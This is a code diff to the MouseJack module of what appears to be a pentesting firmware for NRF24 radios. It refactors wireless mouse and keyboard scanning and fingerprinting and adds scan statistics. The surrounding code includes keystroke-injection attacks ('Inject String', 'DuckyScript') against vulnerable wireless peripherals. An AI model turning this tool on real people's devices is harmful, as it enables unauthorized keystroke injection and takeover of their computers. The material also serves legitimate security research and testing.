@@ -11,6 +11,7 @@
  */
 #if !defined(LITE_VERSION)
 #include "nrf_mousejack.h"
+#include "nrf_esb_stats.h"
 #include "core/display.h"
 #include "core/mykeyboard.h"
 #include "core/sd_functions.h"
@@ -26,6 +27,7 @@ static constexpr int ATTACK_INTER_KEY_MS = 10;
 // ── Static module state ─────────────────────────────────────────
 static MjTarget mj_targets[MJ_MAX_TARGETS];
 static uint8_t mj_targetCount = 0;
+static NrfEsbScanStats mj_scanStats;
 static uint16_t mj_msSequence = 0;
 static NRF24_MODE mj_nrfMode = NRF_MODE_SPI;
 
@@ -226,16 +228,6 @@ static bool mj_asciiToHid(char c, MjHidKey &out) {
     return (out.keycode != MJ_KEY_NONE);
 }
 
-// ── CRC16-CCITT for ESB packet validation ───────────────────────
-static uint16_t mj_crcUpdate(uint16_t crc, uint8_t byte, uint8_t bits) {
-    crc = crc ^ ((uint16_t)byte << 8);
-    while (bits--) {
-        if ((crc & 0x8000) == 0x8000) crc = (crc << 1) ^ 0x1021;
-        else crc = crc << 1;
-    }
-    return crc & 0xFFFF;
-}
-
 // ── Target Management ───────────────────────────────────────────
 static int mj_findTarget(const uint8_t *addr, uint8_t addrLen) {
     for (uint8_t i = 0; i < mj_targetCount; i++) {
@@ -287,6 +279,7 @@ static bool mj_validateNrfMode() {
 // ── Fingerprinting ──────────────────────────────────────────────
 static void
 mj_fingerprintPayload(const uint8_t *payload, uint8_t size, const uint8_t *addr, uint8_t channel) {
+    if (size == 0) return; // Empty ESB acknowledgements have no device signature.
     // Microsoft Mouse detection:
     // size==19 && payload[0]==0x08 && payload[6]==0x40 → unencrypted
     // size==19 && payload[0]==0x0A → encrypted
@@ -319,52 +312,9 @@ mj_fingerprintPayload(const uint8_t *payload, uint8_t size, const uint8_t *addr,
 }
 
 static void mj_fingerprint(const uint8_t *rawBuf, uint8_t size, uint8_t channel) {
-    if (size < 10) return;
-
-    uint8_t buf[37];
-    if (size > 37) size = 37;
-    memcpy(buf, rawBuf, size);
-
-    // Try both raw buffer and 1-bit right-shifted version
-    // (handles both 0xAA and 0x55 preamble alignments)
-    for (int offset = 0; offset < 2; offset++) {
-        if (offset == 1) {
-            memcpy(buf, rawBuf, size);
-            for (int x = size - 1; x >= 0; x--) {
-                if (x > 0) buf[x] = (buf[x - 1] << 7) | (buf[x] >> 1);
-                else buf[x] = buf[x] >> 1;
-            }
-        }
-
-        // Read payload length from PCF (upper 6 bits of byte [5])
-        uint8_t payloadLength = buf[5] >> 2;
-
-        if (payloadLength == 0 || payloadLength > (size - 9)) continue;
-
-        // Extract and verify CRC16-CCITT
-        uint16_t crcGiven = ((uint16_t)buf[6 + payloadLength] << 9) | ((uint16_t)buf[7 + payloadLength] << 1);
-        crcGiven = (crcGiven << 8) | (crcGiven >> 8);
-        if (buf[8 + payloadLength] & 0x80) crcGiven |= 0x0100;
-
-        uint16_t crcCalc = 0xFFFF;
-        for (int x = 0; x < 6 + payloadLength; x++) { crcCalc = mj_crcUpdate(crcCalc, buf[x], 8); }
-        crcCalc = mj_crcUpdate(crcCalc, buf[6 + payloadLength] & 0x80, 1);
-        crcCalc = (crcCalc << 8) | (crcCalc >> 8);
-
-        if (crcCalc != crcGiven) continue;
-
-        // CRC verified! Extract address and payload
-        uint8_t addr[5];
-        memcpy(addr, buf, 5);
-
-        uint8_t esbPayload[32];
-        for (int x = 0; x < payloadLength; x++) {
-            esbPayload[x] = ((buf[6 + x] << 1) & 0xFF) | (buf[7 + x] >> 7);
-        }
-
-        mj_fingerprintPayload(esbPayload, payloadLength, addr, channel);
-        return;
-    }
+    NrfEsbFrame frame;
+    if (!mj_scanStats.consume(rawBuf, size, channel, frame)) return;
+    mj_fingerprintPayload(frame.payload, frame.size, frame.address, channel);
 }
 
 // ── Microsoft Protocol Helpers ──────────────────────────────────
@@ -381,7 +331,7 @@ static void mj_msCrypt(uint8_t *payload, uint8_t size, const uint8_t *addr) {
 // ── Transmit with retransmission ────────────────────────────────
 static void mj_transmitReliable(const uint8_t *frame, uint8_t len) {
     for (int r = 0; r < ATTACK_RETRANSMITS; r++) {
-        NRFradio.write(frame, len, true); // multicast = no ACK wait
+        nrfRadio()->write(frame, len, true); // multicast = no ACK wait
     }
 }
 
@@ -598,18 +548,22 @@ static String mj_formatAddr(const MjTarget &t) {
 static void mj_drawScanScreen(uint8_t currentCh, bool initial) {
     int contentY = BORDER_PAD_Y + FM * LH + 4; // Below title
     int footerH = FP * LH + 4;
-    int listY = contentY + 14; // Below status line
+    int listY = contentY + 26; // Below both status lines
     int listH = tftHeight - listY - footerH - 6;
 
     if (initial) { drawMainBorderWithTitle("MOUSEJACK SCAN"); }
 
     // Status line (below title, inside border)
     tft.setTextSize(FP);
-    tft.fillRect(7, contentY, tftWidth - 14, 12, bruceConfig.bgColor);
+    tft.fillRect(7, contentY, tftWidth - 14, 24, bruceConfig.bgColor);
     tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
     char statusBuf[40];
-    snprintf(statusBuf, sizeof(statusBuf), "CH:%3d  Targets:%d", currentCh, mj_targetCount);
+    snprintf(statusBuf, sizeof(statusBuf), "CH:%u RX:%lu", currentCh,
+             static_cast<unsigned long>(mj_scanStats.received));
     tft.drawCentreString(statusBuf, tftWidth / 2, contentY, 1);
+    snprintf(statusBuf, sizeof(statusBuf), "CRC:%lu Found:%u",
+             static_cast<unsigned long>(mj_scanStats.valid), mj_targetCount);
+    tft.drawCentreString(statusBuf, tftWidth / 2, contentY + 12, 1);
 
     // Target list
     int maxItems = listH / 12;
@@ -637,36 +591,81 @@ static void mj_drawScanScreen(uint8_t currentCh, bool initial) {
 }
 
 // ── Scanning function ───────────────────────────────────────────
-static bool mj_scan() {
+enum class MjScanResult { Error, Empty, Found };
+
+static void mj_printScanInfo() {
+    Serial.printf("[MJ scan] frames=%lu valid=%lu empty=%lu data=%lu flat=%lu targets=%u\n",
+                  static_cast<unsigned long>(mj_scanStats.received),
+                  static_cast<unsigned long>(mj_scanStats.valid),
+                  static_cast<unsigned long>(mj_scanStats.empty),
+                  static_cast<unsigned long>(mj_scanStats.data),
+                  static_cast<unsigned long>(mj_scanStats.flat), mj_targetCount);
+    if (mj_scanStats.data) {
+        Serial.printf("[MJ scan info] length=%u channel=%u header=%02X:%02X sum8=%02X\n",
+                      mj_scanStats.lastLength, mj_scanStats.lastChannel,
+                      mj_scanStats.header0, mj_scanStats.header1, mj_scanStats.sum8);
+    }
+}
+
+static void mj_scanInfo() {
+    check(AnyKeyPress);
+    check(SelPress);
+    drawMainBorderWithTitle("SCAN INFO");
+    tft.setTextSize(FP);
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    tft.setCursor(BORDER_PAD_X, BORDER_PAD_Y + FM * LH + 4);
+    auto indent = []() { tft.setCursor(BORDER_PAD_X, tft.getCursorY()); };
+    tft.printf("RX:%lu CRC:%lu\n", static_cast<unsigned long>(mj_scanStats.received),
+               static_cast<unsigned long>(mj_scanStats.valid));
+    indent();
+    tft.printf("Empty:%lu Data:%lu\n", static_cast<unsigned long>(mj_scanStats.empty),
+               static_cast<unsigned long>(mj_scanStats.data));
+    indent();
+    tft.printf("Flat:%lu Found:%u\n", static_cast<unsigned long>(mj_scanStats.flat), mj_targetCount);
+    indent();
+    if (mj_scanStats.data) {
+        tft.printf("Last LEN:%u CH:%u\n", mj_scanStats.lastLength, mj_scanStats.lastChannel);
+        indent();
+        tft.printf("Header:%02X %02X Sum8:%02X\n", mj_scanStats.header0, mj_scanStats.header1, mj_scanStats.sum8);
+    } else {
+        tft.println("No data frame captured");
+    }
+    indent();
+    tft.println("Esc: back");
+    mj_printScanInfo();
+    while (!check(EscPress)) vTaskDelay(1);
+}
+
+static MjScanResult mj_scan() {
     mj_targetCount = 0;
+    mj_scanStats = {};
     memset(mj_targets, 0, sizeof(mj_targets));
 
-    if (!mj_validateNrfMode()) return false;
+    if (!mj_validateNrfMode()) return MjScanResult::Error;
 
     if (!nrf_start(mj_nrfMode)) {
         displayError("NRF24 not found", true);
-        return false;
+        return MjScanResult::Error;
     }
 
-    // Configure promiscuous mode
-    NRFradio.setAutoAck(false);
-    NRFradio.disableCRC();
-    NRFradio.setAddressWidth(2);
-    NRFradio.setDataRate(RF24_2MBPS);
-    NRFradio.setPayloadSize(32);
-    NRFradio.setRetries(0, 0);
-    NRFradio.flush_rx();
-    NRFradio.flush_tx();
-
-    const uint8_t noiseAddress[][2] = {
-        {0x55, 0x55},
-        {0xAA, 0xAA},
-        {0xA0, 0xAA},
-        {0xAB, 0xAA},
-        {0xAC, 0xAA},
-        {0xAD, 0xAA}
-    };
-    for (uint8_t i = 0; i < 6; i++) { NRFradio.openReadingPipe(i, noiseAddress[i]); }
+    {
+        auto radio = nrfRadio();
+        radio->stopListening();
+        radio->setAutoAck(false);
+        radio->disableDynamicPayloads();
+        radio->disableCRC();
+        radio->setAddressWidth(2); // Reserved SETUP_AW=0, as in the original receiver.
+        radio->setDataRate(RF24_2MBPS);
+        radio->setPayloadSize(32);
+        radio->setRetries(0, 0);
+        for (uint8_t pipe = 0; pipe < 6; ++pipe) { radio->closeReadingPipe(pipe); }
+        // RF24 writes least-significant byte first. The original AA:00 capture
+        // boundary is required by the decoder; AA:AA / 55:55 do not replace it.
+        const uint8_t address[2] = {0xaa, 0x00};
+        radio->openReadingPipe(0, address);
+        radio->flush_rx();
+        radio->flush_tx();
+    }
 
     mj_drawScanScreen(0, true);
 
@@ -682,20 +681,24 @@ static bool mj_scan() {
                 break;
             }
 
-            NRFradio.setChannel(ch);
-            NRFradio.startListening();
-
-            for (int tries = 0; tries < SCAN_TRIES_PER_CH; tries++) {
-                delayMicroseconds(SCAN_DWELL_US);
-
-                if (NRFradio.available()) {
-                    uint8_t rxBuf[32];
-                    NRFradio.read(rxBuf, sizeof(rxBuf));
-                    mj_fingerprint(rxBuf, 32, ch);
+            uint8_t received[SCAN_TRIES_PER_CH][32];
+            int receivedCount = 0;
+            {
+                // Keep CE/CS stable for this bounded receive window. Per-call
+                // locking alone allowed keyboard I2C to interrupt reception.
+                auto radio = nrfRadio();
+                radio->setChannel(ch);
+                radio->flush_rx(); // Do not attribute a previous channel's capture to this one.
+                radio->startListening();
+                for (int tries = 0; tries < SCAN_TRIES_PER_CH; tries++) {
+                    delayMicroseconds(SCAN_DWELL_US);
+                    if (radio->available()) { radio->read(received[receivedCount++], 32); }
                 }
+                radio->stopListening();
             }
-
-            NRFradio.stopListening();
+            for (int packet = 0; packet < receivedCount; ++packet) {
+                mj_fingerprint(received[packet], 32, ch);
+            }
 
             // Refresh display periodically
             if (millis() - lastRefresh > 200 || mj_targetCount != lastDrawnCount) {
@@ -703,13 +706,14 @@ static bool mj_scan() {
                 lastDrawnCount = mj_targetCount;
                 lastRefresh = millis();
             }
-            vTaskDelay(pdMS_TO_TICKS(1));
+            vTaskDelay(1); // Always yield a full tick with the radio guard released.
         }
     }
 
-    NRFradio.stopListening();
-    NRFradio.powerDown();
-    return (mj_targetCount > 0);
+    nrfRadio()->stopListening();
+    nrfRadio()->powerDown();
+    mj_printScanInfo();
+    return mj_targetCount > 0 ? MjScanResult::Found : MjScanResult::Empty;
 }
 
 // ══════════════════════════════════════════════════════════════════
@@ -717,25 +721,25 @@ static bool mj_scan() {
 // ══════════════════════════════════════════════════════════════════
 
 static void mj_setupTxForTarget(const MjTarget &target) {
-    NRFradio.stopListening();
-    NRFradio.setAutoAck(false);
-    NRFradio.setDataRate(RF24_2MBPS);
-    NRFradio.setPALevel(RF24_PA_MAX);
-    NRFradio.setAddressWidth(5);
-    NRFradio.setChannel(target.channel);
-    NRFradio.setRetries(0, 0);
-    NRFradio.flush_rx();
-    NRFradio.flush_tx();
+    nrfRadio()->stopListening();
+    nrfRadio()->setAutoAck(false);
+    nrfRadio()->setDataRate(RF24_2MBPS);
+    nrfRadio()->setPALevel(RF24_PA_MAX);
+    nrfRadio()->setAddressWidth(5);
+    nrfRadio()->setChannel(target.channel);
+    nrfRadio()->setRetries(0, 0);
+    nrfRadio()->flush_rx();
+    nrfRadio()->flush_tx();
 
     uint8_t addr[5];
     memcpy(addr, target.address, 5);
-    NRFradio.openWritingPipe(addr);
+    nrfRadio()->openWritingPipe(addr);
 
     // Set payload size based on device type
     if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
-        NRFradio.setPayloadSize(19);
+        nrfRadio()->setPayloadSize(19);
     } else {
-        NRFradio.setPayloadSize(10);
+        nrfRadio()->setPayloadSize(10);
     }
 }
 
@@ -786,7 +790,7 @@ static void mj_attackString(int targetIndex) {
 
     mj_typeString(target, text.c_str());
 
-    NRFradio.powerDown();
+    nrfRadio()->powerDown();
     displaySuccess("Injection complete", true);
 }
 
@@ -884,7 +888,7 @@ static void mj_attackDucky(int targetIndex) {
     }
 
     file.close();
-    NRFradio.powerDown();
+    nrfRadio()->powerDown();
     displaySuccess("Script complete", true);
 }
 
@@ -895,14 +899,14 @@ static void mj_attackDucky(int targetIndex) {
 static void mj_attackMenu(int targetIndex) {
     const MjTarget &target = mj_targets[targetIndex];
 
-    options = {
+    std::vector<Option> targetOptions = {
         {"Inject String", [&]() { mj_attackString(targetIndex); }},
         {"DuckyScript",   [&]() { mj_attackDucky(targetIndex); } },
         {"Back",          [=]() { /* return */ }                 },
     };
 
     String title = String("[") + mj_getTypeLabel(target.type) + "] " + mj_formatAddr(target);
-    loopOptions(options, MENU_TYPE_SUBMENU, title.c_str());
+    loopOptions(targetOptions, MENU_TYPE_SUBMENU, title.c_str());
 }
 
 static void mj_targetListMenu() {
@@ -913,18 +917,18 @@ static void mj_targetListMenu() {
 
     bool inList = true;
     while (inList) {
-        options.clear();
+        if (mj_targetCount == 0) return;
+        std::vector<Option> targetOptions;
         for (int i = 0; i < mj_targetCount; i++) {
             String label = String("[") + mj_getTypeLabel(mj_targets[i].type) + "] " +
                            mj_formatAddr(mj_targets[i]) + " ch" + String(mj_targets[i].channel);
             int idx = i;
-            options.push_back({label.c_str(), [idx]() { mj_attackMenu(idx); }});
+            targetOptions.push_back({label.c_str(), [idx]() { mj_attackMenu(idx); }});
         }
-        options.push_back({"Rescan", [&]() { mj_scan(); }});
-        options.push_back({"Back", [&]() { inList = false; }});
+        targetOptions.push_back({"Rescan", [&]() { mj_scan(); }});
+        targetOptions.push_back({"Back", [&]() { inList = false; }});
 
-        loopOptions(options, MENU_TYPE_SUBMENU, "Targets");
-        if (returnToMenu) return;
+        if (loopOptions(targetOptions, MENU_TYPE_SUBMENU, "Targets") < 0 || returnToMenu) return;
     }
 }
 
@@ -933,24 +937,28 @@ static void mj_targetListMenu() {
 // ══════════════════════════════════════════════════════════════════
 
 void nrf_mousejack() {
-    options = {
-        {"Set NRF Mode",
-         [=]() {
-             NRF24_MODE selected = nrf_setMode();
-             if (selected != NRF_MODE_DISABLED) mj_nrfMode = selected;
-         }                                             },
-        {"Scan Devices",
-         [=]() {
-             if (mj_scan()) {
-                 mj_targetListMenu();
-             } else {
-                 displayInfo("No devices found", true);
-             }
-         }                                             },
-        {"View Targets", [=]() { mj_targetListMenu(); }},
-        {"Main Menu",    [=]() { returnToMenu = true; }},
-    };
+    while (!returnToMenu) {
+        std::vector<Option> mousejackOptions = {
+            {CHECK_NRF_SPI(mj_nrfMode) ? "NRF Mode: SPI" : "Set NRF Mode",
+             [=]() {
+                 NRF24_MODE selected = nrf_selectMode(mj_nrfMode, true);
+                 if (selected != NRF_MODE_DISABLED) mj_nrfMode = selected;
+             }},
+            {"Scan Devices",
+             [=]() {
+                 const MjScanResult result = mj_scan();
+                 if (result == MjScanResult::Found) {
+                     mj_targetListMenu();
+                 } else if (result == MjScanResult::Empty) {
+                     mj_scanInfo();
+                 }
+             }},
+            {"Scan Info", [=]() { mj_scanInfo(); }},
+            {"View Targets", [=]() { mj_targetListMenu(); }},
+            {"Main Menu",    [=]() { returnToMenu = true; }},
+        };
 
-    loopOptions(options, MENU_TYPE_SUBMENU, "MouseJack");
+        if (loopOptions(mousejackOptions, MENU_TYPE_SUBMENU, "MouseJack") < 0) break;
+    }
 }
 #endif
